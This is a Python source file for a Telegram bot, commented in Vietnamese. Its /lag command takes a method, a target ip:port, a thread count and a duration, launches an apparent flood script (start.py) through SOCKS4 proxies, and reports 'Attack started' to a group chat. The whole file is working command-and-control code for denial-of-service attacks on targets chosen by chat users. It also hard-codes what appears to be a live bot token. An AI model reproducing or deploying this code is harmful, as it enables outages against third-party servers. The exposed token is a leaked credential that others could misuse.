import logging
import subprocess
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Cấu hình logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Token của bot
TOKEN = "7554983188:AAE1VbqSBBVilW8wsJYC-LZEn1rmORE1Rqo"  # Thay YOUR_BOT_TOKEN bằng token của bot

# ID của nhóm
GROUP_CHAT_ID = -1002307642304  # Thay bằng ID nhóm của bạn

# Hàm gửi tin nhắn đến nhóm
def send_to_group(context: CallbackContext, message: str) -> None:
    context.bot.send_message(chat_id=GROUP_CHAT_ID, text=message)

# Hàm xử lý lệnh /lag
def lag_command(update: Update, context: CallbackContext) -> None:
    try:
        # Lấy các tham số từ lệnh
        args = context.args
        if len(args) != 4:
            update.message.reply_text("⚠️ Usage: /lag <method> <ip:port> <threads> <duration>")
            return

        method, target, threads, duration = args

        # Kiểm tra định dạng ip:port
        if ":" not in target:
            update.message.reply_text("⚠️ Invalid target format. Use <ip:port>")
            return

        # Tách ip và port
        ip, port = target.split(":")

        # Kiểm tra threads và duration là số
        if not threads.isdigit() or not duration.isdigit():
            update.message.reply_text("⚠️ Threads and duration must be numbers.")
            return

        # Tạo lệnh để chạy start.py
        command = [
            "python3", "start.py",
            method.upper(),  # Phương thức
            f"http://{ip}:{port}",  # Target (ip:port)
            "4",  # Proxy type (mặc định là SOCKS4)
            threads,  # Số luồng
            "proxies.txt",  # File proxies
            "10",  # RPC (mặc định)
            duration,  # Thời lượng
        ]

        # Chạy lệnh trong một tiến trình riêng biệt
        subprocess.Popen(command)
        message = f"🟢 Attack started with method {method} on {ip}:{port} using {threads} threads for {duration} seconds."
        update.message.reply_text(message)
        send_to_group(context, message)  # Gửi tin nhắn đến nhóm
    except Exception as e:
        error_message = f"🔴 Error: {e}"
        update.message.reply_text(error_message)
        send_to_group(context, error_message)  # Gửi thông báo lỗi đến nhóm

# Hàm trợ giúp
def help_command(update: Update, context: CallbackContext) -> None:
    help_text = (
        "Commands:\n"
        "/lag <method> <ip:port> <threads> <duration> - Start an attack\n"
        "/help - Show this help message"
    )
    update.message.reply_text(help_text)
    send_to_group(context, help_text)  # Gửi tin nhắn trợ giúp đến nhóm

# Hàm chính
def main() -> None:
    # Khởi tạo bot với token
    updater = Updater(TOKEN)

    dispatcher = updater.dispatcher

    # Đăng ký các lệnh
    dispatcher.add_handler(CommandHandler("lag", lag_command))
    dispatcher.add_handler(CommandHandler("help", help_command))

    # Khởi động bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()